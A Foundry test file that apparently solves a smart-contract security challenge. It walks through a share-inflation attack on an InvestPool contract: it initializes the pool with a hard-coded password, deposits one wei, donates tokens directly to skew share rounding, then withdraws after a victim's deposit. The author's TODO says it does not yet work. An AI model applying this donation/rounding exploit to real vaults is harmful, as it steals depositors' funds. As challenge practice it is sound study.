// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/PoolToken.sol";
import "../src/InvestPool.sol";

//TODO: Still not working, idk why

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.startPrank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
		vm.startPrank(hacker);

        // solution
        //First we initialize the pool
        pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");

        //then we deposit 1 to get 1 share
        pool.deposit(1);

        //now we transfer 100e18 tokens (yielding us no shares) to confuse the division
        token.transfer(address(pool), 100e18);
        vm.stopPrank();
        
        //now the user deposits all his tokens
        userDeposit(1000e18);

        //now we withdraw all our shares, which should give us 1009999999999999999999 tokens
        vm.startPrank(hacker);
        pool.withdrawAll();
		vm.stopPrank();
        
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}